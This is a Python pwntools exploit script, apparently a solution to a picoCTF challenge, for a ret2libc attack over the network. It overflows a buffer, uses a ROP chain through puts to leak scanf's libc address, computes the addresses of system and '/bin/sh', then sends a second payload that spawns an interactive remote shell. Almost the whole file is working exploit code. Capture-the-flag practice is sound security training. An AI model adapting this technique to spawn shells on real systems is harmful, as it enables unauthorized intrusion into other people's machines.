#!/usr/bin/env python3
#thanks John Hammond (and Matt)

from pwn import process as process, p64 as p64, log as log, u64 as u64, gdb as gdb, remote as remote;

# p = process("./vuln")
# gdb.attach(p) # debug after p

p = remote('mercury.picoctf.net', 49464)

offset = 136
junk = b"A"*136

"""
Attack:
    user puts to leak an address
    we need to supply arguments to puts
    user ROP for this
    ... but will need the x86/64 calling conventions 
    find ROP that modifies rdi (first argument in function call)
        0x0000000000400913 : pop rdi ; ret

    After leak, we calculate the offset between the leaked scanf address and the function that we want to use.
    (i.e. the difference between that address and the system address)
"""
pop_rdi = 0x400913
scanf_at_got = 0x601028 # found in got.plt 
puts_at_plt = 0x400540 # found in plt (jump to this to run)
back_to_main = 0x400771 #found at top of main

payload = [
    junk,
    #call puts with scanf to leak scanf address
    p64(pop_rdi), # pop rdi
    p64(scanf_at_got), # insert scanf function
    p64(puts_at_plt), # call puts(scanf)
    p64(back_to_main) # return value so program doesnt crash
]
#p64 packs integers into bytes

payload = b''.join(payload)

p.sendline(payload)

p.recvline()
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b'\x00')) #ljust pad to 8 bytes
log.info(f"{hex(leak)=}") # gives us address of scanf - use to find address of system

scanf_offset = 0x88540 #physical address in libc (system)
base_addr_of_libc = leak - scanf_offset
log.info(f"{hex(base_addr_of_libc)=}")

system_offset = 0x4F4E0
system_address = base_addr_of_libc + system_offset

base_bin_offset = 0x1b40fa
address_of_bin_sh = base_addr_of_libc + base_bin_offset

ret_instruction = 0x40052e

second_payload = [
    junk,
    p64(pop_rdi),
    p64(address_of_bin_sh),
    p64(ret_instruction), # needed for stack allignment
    p64(system_address) # run system(/bin/sh)
]

second_payload = b"".join(second_payload)
p.sendline(second_payload)

p.interactive()